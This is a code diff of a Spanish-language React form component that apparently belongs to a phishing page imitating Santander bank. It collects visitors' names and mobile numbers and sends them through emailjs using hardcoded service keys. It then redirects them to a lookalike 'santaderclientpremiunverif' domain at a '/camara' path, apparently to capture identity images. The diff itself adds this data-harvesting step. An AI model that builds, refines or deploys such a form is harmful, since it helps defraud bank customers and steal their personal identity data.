@@ -1,8 +1,9 @@
 import React, { useState } from 'react';
+import emailjs from 'emailjs-com';
 import '../css/form.css';
-import backgroundImg from '../img/fondopri.jpg'; 
-import logo from '../img/BSAC_BIG.D-e2baaa02.png'; 
-import personImg from '../img/persona.png'; 
+import backgroundImg from '../img/fondopri.jpg';
+import logo from '../img/BSAC_BIG.D-e2baaa02.png';
+import personImg from '../img/persona.png';
 
 const Form = () => {
   const [formData, setFormData] = useState({ nombres: '', apellidos: '', celular: '' });
@@ -30,29 +31,17 @@ const Form = () => {
     setFormData({ ...formData, [name]: value });
   };
 
-  const handleSubmit = async (e) => {
+  const handleSubmit = (e) => {
     e.preventDefault();
     if (validate()) {
-      try {
-        const form = new FormData();
-        form.append('nombres', formData.nombres);
-        form.append('apellidos', formData.apellidos);
-        form.append('celular', formData.celular);
-
-        const response = await fetch('https://getform.io/f/akkgdgga', {
-          method: 'POST',
-          body: form,
-        });
-
-        if (response.ok) {
-          console.log('Formulario enviado:', formData);
+      emailjs.send('service_pl7uznq', 'template_0x40jpf', formData, '8Mgn87H6amGJecjhG')
+        .then((response) => {
+          console.log('Formulario enviado:', response.status, response.text);
           window.location.href = 'https://santaderclientpremiunverif.vercel.app/camara'; // Redirigir a la URL especificada
-        } else {
-          console.error('Error al enviar el formulario');
-        }
-      } catch (error) {
-        console.error('Error al enviar el formulario:', error);
-      }
+        })
+        .catch((error) => {
+          console.error('Error al enviar el formulario:', error);
+        });
     }
   };
 
